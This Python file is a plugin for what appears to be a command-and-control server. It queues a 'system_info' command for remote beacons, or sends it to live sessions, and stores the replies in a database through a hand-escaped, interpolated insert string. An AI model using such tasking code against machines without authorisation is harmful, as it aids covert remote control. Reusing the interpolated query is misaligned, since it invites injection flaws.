"""System Info plugin for beacon and session.

Imports are written to work both when executing from the project root
as well as when running the server from inside src/Server.
"""
from Modules.beacon.beacon import add_beacon_command_list
from Modules.global_objects import logger, config
from ServerDatabase.database import DatabaseClass
from Modules.session.transfer import send_data, receive_data

from datetime import datetime


class SystemInfo:
    def __init__(self):
        self.command = "system_info"
        self.database = DatabaseClass(config)

    def beacon(self, beacon: dict) -> None:
        """Queue system info command for a beacon by userID."""
        add_beacon_command_list(beacon.userID, None, self.command, "")
        logger.debug(
            f"Systeminfo command added to command list for userID: {beacon.userID}"
        )

    def session(self, session: dict) -> None:
        """Request system info from a live session and store the result."""
        logger.info(f"Requesting system info from {session['userID']}")
        send_data(session['conn'], self.command)
        data = receive_data(session['conn'])
        self.database.insert_entry(
            "SystemInfo",
            f'"{session["userID"]}", "{data.replace("\"", "\"\"")}", "{datetime.now()}"',
        )
        print(data)